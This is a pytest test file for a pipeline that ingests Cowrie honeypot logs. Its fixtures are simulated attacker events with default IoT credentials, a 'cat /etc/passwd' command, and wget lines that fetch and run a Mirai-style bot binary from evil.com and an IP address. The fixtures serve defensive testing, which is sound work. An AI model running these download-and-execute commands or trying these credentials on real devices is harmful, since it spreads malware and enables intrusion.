"""tests/test_ingest_cowrie.py — Unit + fake-attack injection tests for pipeline.ingest_cowrie."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from pipeline.ingest_cowrie import parse_cowrie_line, ingest_cowrie

FIXTURES = Path(__file__).parent / "fixtures"


RUN_ID   = "test-run-000"
GIT_HASH = "deadbeef"
LOG_FILE = "/tmp/cowrie.json"


def _parse(raw_dict: dict, line_no: int = 1):
    return parse_cowrie_line(json.dumps(raw_dict), RUN_ID, GIT_HASH, LOG_FILE, line_no)


# ---------------------------------------------------------------------------

class TestParseCowrieLogin:
    def test_login_failed_event_type(self):
        ev = _parse({"eventid": "cowrie.login.failed", "timestamp": "2026-04-10T00:00:00Z",
                     "src_ip": "1.2.3.4", "src_port": 1234, "username": "root", "password": "123"})
        assert ev is not None
        assert ev["event_type"] == "login.failed"

    def test_login_failed_captures_credentials(self):
        ev = _parse({"eventid": "cowrie.login.failed", "timestamp": "2026-04-10T00:00:00Z",
                     "src_ip": "1.2.3.4", "src_port": 1234, "username": "admin", "password": "pass"})
        assert ev["username"] == "admin"
        assert ev["password"] == "pass"

    def test_login_success_event_type(self):
        ev = _parse({"eventid": "cowrie.login.success", "timestamp": "2026-04-10T00:00:01Z",
                     "src_ip": "5.6.7.8", "src_port": 9999, "username": "pi", "password": "raspberry"})
        assert ev["event_type"] == "login.success"

    def test_source_ip_captured(self):
        ev = _parse({"eventid": "cowrie.login.failed", "timestamp": "2026-04-10T00:00:00Z",
                     "src_ip": "185.220.101.45", "src_port": 51234})
        assert ev["source_ip"] == "185.220.101.45"
        assert ev["source_port"] == 51234


class TestParseCowrieCommand:
    def test_command_input_event_type(self):
        ev = _parse({"eventid": "cowrie.command.input", "timestamp": "2026-04-10T00:01:00Z",
                     "src_ip": "1.2.3.4", "input": "cat /etc/passwd"})
        assert ev["event_type"] == "command.input"

    def test_command_str_captured(self):
        ev = _parse({"eventid": "cowrie.command.input", "timestamp": "2026-04-10T00:01:00Z",
                     "src_ip": "1.2.3.4", "input": "wget http://evil.com/bot.sh"})
        assert ev["command_str"] == "wget http://evil.com/bot.sh"


class TestParseCowrieFileDownload:
    def test_file_download_event_type(self):
        ev = _parse({"eventid": "cowrie.session.file_download",
                     "timestamp": "2026-04-10T00:02:00Z", "src_ip": "1.2.3.4",
                     "url": "http://evil.com/bot", "shasum": "abc123"})
        assert ev["event_type"] == "session.file_download"

    def test_url_and_hash_in_raw_data(self):
        ev = _parse({"eventid": "cowrie.session.file_download",
                     "timestamp": "2026-04-10T00:02:00Z", "src_ip": "1.2.3.4",
                     "url": "http://evil.com/bot", "shasum": "abc123"})
        assert ev["raw_data"]["url"] == "http://evil.com/bot"
        assert ev["raw_data"]["shasum"] == "abc123"


class TestParseCowrieProvenance:
    def test_provenance_fields_set(self):
        ev = _parse({"eventid": "cowrie.login.failed", "timestamp": "2026-04-10T00:00:00Z",
                     "src_ip": "1.2.3.4"}, line_no=7)
        assert ev["pipeline_run_id"]   == RUN_ID
        assert ev["pipeline_version"]  == GIT_HASH
        assert ev["raw_file_path"]     == LOG_FILE
        assert ev["raw_line_number"]   == 7
        assert ev["source"]            == "cowrie"

    def test_invalid_json_returns_none(self):
        result = parse_cowrie_line("not json!", RUN_ID, GIT_HASH, LOG_FILE, 1)
        assert result is None

    def test_missing_timestamp_does_not_crash(self):
        ev = _parse({"eventid": "cowrie.login.failed", "src_ip": "1.2.3.4"})
        assert ev is not None

    def test_dest_port_captured(self):
        ev = _parse({"eventid": "cowrie.login.failed", "timestamp": "2026-04-10T00:00:00Z",
                     "src_ip": "1.2.3.4", "dst_port": 22})
        assert ev["dest_port"] == 22


# ---------------------------------------------------------------------------
# Fake attack injection tests — full ingest_cowrie pipeline (no DB)
# ---------------------------------------------------------------------------

# Realistic fake IoT attacker events
FAKE_MIRAI_LOGIN = {
    "eventid": "cowrie.login.failed",
    "timestamp": "2026-05-15T09:00:00.000000Z",
    "src_ip": "185.220.101.45",
    "src_port": 53412,
    "dst_port": 23,
    "username": "root",
    "password": "xc3511",
    "session": "mirai001",
}

FAKE_BOTNET_COMMAND = {
    "eventid": "cowrie.command.input",
    "timestamp": "2026-05-15T09:01:00.000000Z",
    "src_ip": "45.142.212.10",
    "src_port": 61234,
    "dst_port": 22,
    "input": "busybox ECCHI wget http://93.183.221.7/bins/arm7 -O /tmp/arm7; chmod +x /tmp/arm7; /tmp/arm7",
    "session": "bot002",
}

FAKE_MALWARE_DOWNLOAD = {
    "eventid": "cowrie.session.file_download",
    "timestamp": "2026-05-15T09:02:00.000000Z",
    "src_ip": "45.142.212.10",
    "src_port": 61234,
    "dst_port": 22,
    "url": "http://93.183.221.7/bins/arm7",
    "shasum": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "session": "bot002",
}

FAKE_TELNET_BRUTE = {
    "eventid": "cowrie.login.success",
    "timestamp": "2026-05-15T09:03:00.000000Z",
    "src_ip": "91.92.251.32",
    "src_port": 55000,
    "dst_port": 23,
    "username": "admin",
    "password": "1234",
    "session": "teln003",
}

FAKE_SSH_HASSH = {
    "eventid": "cowrie.login.failed",
    "timestamp": "2026-05-15T09:04:00.000000Z",
    "src_ip": "203.0.113.5",
    "src_port": 40001,
    "dst_port": 22,
    "username": "pi",
    "password": "raspberry",
    "session": "ssh004",
    "hassh": "b12d2871a1189eff20364cf5333619ee",
}


class TestFakeAttackParsing:
    """Verify fake realistic attack events are fully captured."""

    def test_mirai_telnet_brute_parsed(self):
        ev = _parse(FAKE_MIRAI_LOGIN)
        assert ev is not None
        assert ev["source_ip"]   == "185.220.101.45"
        assert ev["dest_port"]   == 23
        assert ev["protocol"]    == "telnet"
        assert ev["username"]    == "root"
        assert ev["password"]    == "xc3511"
        assert ev["event_type"]  == "login.failed"

    def test_botnet_command_captured(self):
        ev = _parse(FAKE_BOTNET_COMMAND)
        assert ev is not None
        assert ev["command_str"] is not None
        assert "busybox" in ev["command_str"]
        assert ev["event_type"]  == "command.input"

    def test_malware_download_fields(self):
        ev = _parse(FAKE_MALWARE_DOWNLOAD)
        assert ev is not None
        assert ev["download_url"] == "http://93.183.221.7/bins/arm7"
        assert ev["file_hash"]    == FAKE_MALWARE_DOWNLOAD["shasum"]
        assert ev["event_type"]   == "session.file_download"

    def test_telnet_login_success_protocol(self):
        ev = _parse(FAKE_TELNET_BRUTE)
        assert ev is not None
        assert ev["protocol"]    == "telnet"
        assert ev["event_type"]  == "login.success"

    def test_hassh_fingerprint_captured(self):
        ev = _parse(FAKE_SSH_HASSH)
        assert ev is not None
        assert ev["hassh"] == "b12d2871a1189eff20364cf5333619ee"

    def test_non_cowrie_event_rejected(self):
        ev = _parse({"eventid": "dionaea.something", "timestamp": "2026-05-15T09:00:00Z",
                     "src_ip": "1.2.3.4"})
        assert ev is None

    def test_missing_eventid_rejected(self):
        ev = _parse({"timestamp": "2026-05-15T09:00:00Z", "src_ip": "1.2.3.4"})
        assert ev is None


class TestIngestCowrieFakeLog:
    """Inject fake attack log lines through the full ingest_cowrie pipeline."""

    def _make_fake_log(self, tmp_path, events: list[dict]) -> Path:
        log_file = tmp_path / "cowrie.json"
        log_file.write_text("\n".join(json.dumps(e) for e in events) + "\n")
        return log_file

    def _mock_db(self, monkeypatch, stored_events: list):
        import pipeline.db as _db_module

        monkeypatch.setattr(_db_module, "record_run_start",
                            lambda task, params=None: "mock-run-id")
        monkeypatch.setattr(_db_module, "record_run_end",
                            lambda run_id, status, **kw: None)
        monkeypatch.setattr(_db_module, "store_events",
                            lambda evs: (stored_events.extend(evs), len(evs))[1])

    def test_ingest_sample_fixture(self, tmp_path, monkeypatch):
        """Ingest the 5-line fixture; expect 5 events (all are cowrie.* events)."""
        monkeypatch.setenv("PIPELINE_STATE_DIR", str(tmp_path / "state"))
        stored = []
        self._mock_db(monkeypatch, stored)

        log_file = tmp_path / "cowrie.json"
        log_file.write_text((FIXTURES / "cowrie_sample.json").read_text())

        events = ingest_cowrie.__wrapped__(log_path=log_file, run_id="mock-run-id")
        assert len(events) == 5, (
            f"Expected 5 events from sample fixture but got {len(events)}"
        )

    def test_ingest_fake_attacks_end_to_end(self, tmp_path, monkeypatch):
        """All fake attacks must be ingested without being dropped."""
        monkeypatch.setenv("PIPELINE_STATE_DIR", str(tmp_path / "state"))
        stored = []
        self._mock_db(monkeypatch, stored)

        attacks = [
            FAKE_MIRAI_LOGIN, FAKE_BOTNET_COMMAND,
            FAKE_MALWARE_DOWNLOAD, FAKE_TELNET_BRUTE, FAKE_SSH_HASSH,
        ]
        log_file = self._make_fake_log(tmp_path, attacks)

        events = ingest_cowrie.__wrapped__(log_path=log_file, run_id="mock-run-id")
        assert len(events) == 5, (
            f"Expected 5 fake attacks but ingested {len(events)}"
        )

    def test_ingest_is_idempotent(self, tmp_path, monkeypatch):
        """Re-running ingest on the same file (bookmark set) must yield 0 new events."""
        monkeypatch.setenv("PIPELINE_STATE_DIR", str(tmp_path / "state"))
        stored = []
        self._mock_db(monkeypatch, stored)

        log_file = self._make_fake_log(tmp_path, [FAKE_MIRAI_LOGIN, FAKE_BOTNET_COMMAND])

        first_run  = ingest_cowrie.__wrapped__(log_path=log_file, run_id="run-1")
        second_run = ingest_cowrie.__wrapped__(log_path=log_file, run_id="run-2")

        assert len(first_run)  == 2
        assert len(second_run) == 0, (
            "Second run on unchanged file must return 0 events (bookmark not working)"
        )
